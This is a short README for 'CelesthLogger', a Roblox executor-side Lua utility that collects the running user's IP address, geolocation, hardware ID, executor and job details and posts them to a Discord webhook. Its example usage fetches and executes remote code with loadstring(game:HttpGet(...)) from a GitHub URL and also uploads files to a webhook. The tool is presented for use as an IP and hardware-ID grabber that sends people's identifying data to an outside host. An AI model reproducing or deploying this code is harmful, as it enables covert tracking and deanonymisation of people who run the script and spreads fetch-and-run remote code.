# CelesthLogger

**CelesthLogger** is a Roblox executor-side logging utility that sends detailed webhook logs to Discord.

## 🔧 Features

- IP logging (`https://v4.ident.me`)
- Geo info from `ip-api.com`
- HWID (ClientId)
- Executor detection
- One-time user logging (`stellarium/logged.txt`)
- Cooldown logic (`G_.LastSent`)
- Customizable embed data
- Optional file logging (`:SendFile`)

## 📦 Example Usage

```lua
_G.IpLog = false
_G.GeoLog = true
_G.HwidLog = true
_G.ExecutorLog = true
_G.JobIdLog = true
_G.IgnoreLoggedCheck = false
_G.IgnoreCooldown = false
_G.WebhookCooldown = 60
_G.PingEveryone = false
_G.EmbedTitle = "Module:"
_G.EmbedMessage = ""
_G.EmbedColor = 2303786
_G.EmbedThumbnail = ""

local Celesth = loadstring(game:HttpGet("https://raw.githubusercontent.com/Celesth/celes.wh/main/mainUtils.luau"))()

Celesth:Log("https://discord.com/api/webhooks/...")

Celesth:SendFile("https://discord.com/api/webhooks/...", "log.txt", "Executed by "..game.Players.LocalPlayer.Name, "📁 Log attached")
